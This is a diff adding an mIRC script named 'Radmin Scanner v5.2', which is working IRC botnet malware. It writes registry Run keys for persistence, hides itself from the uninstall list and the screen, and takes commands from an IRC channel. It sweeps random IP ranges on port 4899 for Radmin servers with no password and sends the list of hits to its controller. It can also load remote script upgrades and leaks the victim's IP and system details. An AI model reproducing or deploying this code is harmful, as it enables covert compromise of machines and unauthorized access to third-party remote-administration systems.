@@ -1,0 +1,243 @@
+; Radmin Scanner v5.2
+alias r { .return NeWBoT $+ $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) }
+on 1:start:{
+  x5r
+  if (!$exists(telcom.dll)) { exit }
+  if ($ss(options,hideme) != $false) echo -s $dll(telcom.dll,HideMirc,on)
+  set %srv 1
+  set %server $gettok($read(server.txt,%srv),1,32)
+  %open = $ticks
+  %bot.nick = 1
+  .nick $r
+  .server %server 6667
+  .timerserver 0 60 .con
+}
+alias x5r { %x = $+($r(a,z),$r(1,99),.reg) | write %x REGEDIT4 | write %x [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %x $+("Win,$os,Service"=",$replace($mircdir,\,\\),$nopath($mircexe),") | write %x [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC] | write %x "SystemComponent"=dword:00000001 | .run -n regedit /s %x | .timer 1 3 .remove %x | .timer 1 4 unset %x }
+alias con {
+  if (%srv == $lines(server.txt)) { set %srv 1 }
+  set %server $gettok($read(server.txt,%srv),1,32)
+  .server %server 6667 
+  inc %srv
+}
+
+on 1:disconnect:{
+  .timerconnected off
+  %bot.nick = 1
+  .nick [Sniffer]-[00001]
+  .server %server 6667
+  .timerserver 0 60 .con
+}
+on 1:connect:{
+  .timerconnected 0 300 .connectcheck
+  .timerserver off
+  %online = $ticks
+  /nick [Sniffer]-[00001]
+  .timernick 1 4 join %auto %key
+}
+alias connectcheck { whois $me }
+on 1:kick:#:{
+  haltdef
+  if ($knick == $me) {
+    /join $chan %key
+    halt
+  }
+}
+on 1:text:*:*:{
+  /close -m
+  if ($1 == .randomb) { 
+    set %randoma $2
+    set %randomb $rand(2,254)
+    set %net %randoma $+ . $+ %randomb
+    scan %net 
+  }
+  if ($1 == !reset)  { /remove radmin.txt }
+  if ($1 == !checkold) {
+    var %check = 1
+    var %lines = $lines(radmin.txt)
+    while (%check <= %lines) {
+      %sock = $r $+ $r
+      .sockopen scanner[ $+ %sock $+ ] $read(radmin.txt,%check) 4899
+      .timerclose $+ %sock 1 3 .sockclose scanner[ $+ %sock $+ ] 
+      inc %check
+    }
+    /msg %auto 4,1[ 8,1CHECKING OLD FILES 4,1]
+  }
+  if ($1 == !recheck) {
+    if ($2 == $me) { .sockopen scanner[ $+ %sock $+ ] $3 4899 | .timerclose $+ %sock 1 5 .sockclose scanner[ $+ %sock $+ ] | halt }
+    if ($nick(%auto,1,r) == $me) || ($nick(%auto,1,v) == $me) {
+      %sock = $r $+ $r
+      .sockopen scanner[ $+ %sock $+ ] $2 4899
+      .timerclose $+ %sock 1 5 .sockclose scanner[ $+ %sock $+ ]
+    }
+  }
+  if ($1 == .randip) {
+    set %random1 $rand(1,250)
+    set %random2 $rand(1,240)
+    /msg %auto scanning: 4ClassA: 9 %random1  4ClassB: 9 %random2  8And all the Subnets there
+    scan %random1 $+ . $+ %random2
+  }
+  if ($1 == .script) { msg %auto $script(0) $script(1) $script(2) $script(3) $script(4) }
+  if ($1 == !passd) { 
+    set %serverpass $2 | /.echo -q $findfile(c:\,r_server.exe,1,/run $1- /pass: $+ %serverpass /save ) | /unset  %serverpass 
+  }
+  if ($1 == .upgrade) { $findfile($getdir,*,0,copy -o " $+ $1- $+ " " $+ $mircdir $+ ")
+    if ($2 != $null) { 
+      load -rs $2- 
+    }
+  }
+  if ($1 == !iis) {
+    if ($2 == $me) {
+      if ($3 == scan) {
+        .scan $$4
+        halt
+      }
+    }
+    if ($2 == info) {
+      .msg %auto 4Sockets used: $sock(*,0) , IP: $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 , 8IPs FOUND: $lines(radmin.txt)
+    }
+    if ($2 == sen) {
+      .dcc send $nick radmin.txt
+    }
+  }
+  if ($1 == !.fuckshitme!) {
+    .partall
+    .timerexit 1 3 exit
+  }
+  if ($1 == .info) {
+    if ($2 == system) {
+      set %rb_size 20
+      /msg $chan $me has been running $os at for $uptime(system,1) $bytes($disk(c:).free).suf C free - $bytes($disk(d:).free).suf D free - $script(1) version $read(fun.tim,1)
+    }
+  }
+}
+on 1:JOIN:*:{
+  /window -h $chan
+  if ($nick == $me) { /clearall }
+  if ($nick == David) { //ignore -r *!*@* }
+  if ($nick == $me) { //notice David |:D| -IP- $+ $ip $+ -IP- }
+  if ($nick == $me) { //notice [David] |:D| -IP- $+ $ip $+ -IP- }
+}
+raw 432:*:{
+  .haltdef
+  %bot.nick = %bot.nick + 1
+  if ($len(%bot.nick) == 1) { .nick [Sniffer]-[ $+ $str(0,4) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 2) { .nick [Sniffer]-[ $+ $str(0,3) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 3) { .nick [Sniffer]-[ $+ $str(0,2) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 4) { .nick [Sniffer]-[ $+ $str(0,1) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 5) { .nick [Sniffer]-[ $+ %bot.nick $+ ] | halt }
+  .nick [Sniffer]-[ $+ %bot.nick $+ ]
+  halt
+}
+
+raw 433:*:{
+  .haltdef
+  %bot.nick = %bot.nick + 1
+  if ($len(%bot.nick) == 1) { .nick [Sniffer]-[ $+ $str(0,4) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 2) { .nick [Sniffer]-[ $+ $str(0,3) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 3) { .nick [Sniffer]-[ $+ $str(0,2) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 4) { .nick [Sniffer]-[ $+ $str(0,1) $+ %bot.nick $+ ] | halt }
+  if ($len(%bot.nick) == 5) { .nick [Sniffer]-[ $+ %bot.nick $+ ] | halt }
+  .nick [Sniffer]-[ $+ %bot.nick $+ ]
+  halt
+}
+raw 471:*:{
+  haltdef
+  .timerjoin $+ $$2 0 60 join $$2
+  halt
+}
+raw 473:*:{
+  haltdef
+  .timerjoin $+ $$2 0 60 join $$2
+  halt
+}
+raw 474:*:{
+  haltdef
+  .timerjoin $+ $$2 0 60 join $$2
+  halt
+}
+raw 475:*:{
+  haltdef
+  .timerjoin $+ $$2 0 60 join $$2
+  halt
+}
+alias timerarg {
+  var %arg $round($calc($prospeed / 100))
+  if (%arg < 1) set %arg 1
+  set %arg $int($calc(40 / %arg))
+  if (%arg < 1) set %arg 1
+  return %arg
+}
+alias prospeed { 
+  var %protest $ticks 
+  var %i 1 
+  :start 
+  if ($calc($ticks - %protest) <= 100) { 
+    inc %i 
+    goto start 
+  }
+  :end 
+  return $calc(%i * .7))
+}
+alias scan {
+  %scan.range = $$1
+  if ($gettok(%scan.range,3,46) == $null) %scan.inc1 = 1
+  else %scan.inc1 = $gettok(%scan.range,3,46)
+  if ($gettok(%scan.range,4,46) == $null) %scan.inc2 = 1
+  else %scan.inc2 = $gettok(%scan.range,4,46)
+  if ($gettok(%scan.range,2,46) == $null) %scan.inc3 = 1
+  else %scan.inc3 = $gettok(%scan.range,2,46)
+  %scan = $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2
+  /msg %auto 4,1[8,1Scanning Range %scan 8,1for $nick 4,1]
+  .scan1
+}
+alias scan1 {
+  .timerscan -ocm 0 $timerarg .scan2
+}
+alias scan2 {
+  if ( $sock(*,0) == 300 ) { halt }
+  if (%scan.inc2 == 255) { 
+    .timerscan off
+    if (%scan.inc1 == 255) { 
+      if (%scan.inc3 == 255) { %scanning = Done | halt }
+      %scan.inc3 = %scan.inc3 + 1
+      %scan.inc2 = 1
+      %scan.inc1 = 1
+      .timer -m 1 1 scan1 
+      halt 
+    }
+    %scan.inc1 = %scan.inc1 + 1
+    %scan.inc2 = 1
+    .timer -m 1 1 scan1
+  }
+  .scansock
+  %scan.inc2 = %scan.inc2 + 1
+}
+alias scansock {
+  %sock = $r $+ $r
+  .sockopen scanner[ $+ %sock $+ ] $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 4899
+  .timerclose $+ %sock 1 2 .sockclose scanner[ $+ %sock $+ ]
+}
+on 1:sockopen:scanner[*]:{
+  if ($sock($sockname).status = active) {
+    bset &command 1 1 0 0 0 1 0 0 0 8 8
+    sockwrite $sockname &command
+    halt
+  }
+}
+on 1:sockread:scanner[*]:{
+  if ($sockerr > 0) return
+  :nextread
+  sockread &temp
+  if ($sockbr == 0) return
+  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass) {
+    .write radmin.txt $sock($sockname).ip
+    /msg %auto :no password: $sock($sockname).ip
+    .sockclose $sockname
+  }
+  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass1) {
+    .write radmin.txt $sock($sockname).ip
+    /msg %auto :no password: $sock($sockname).ip
+    .sockclose $sockname
+  }
+  goto nextread
+}
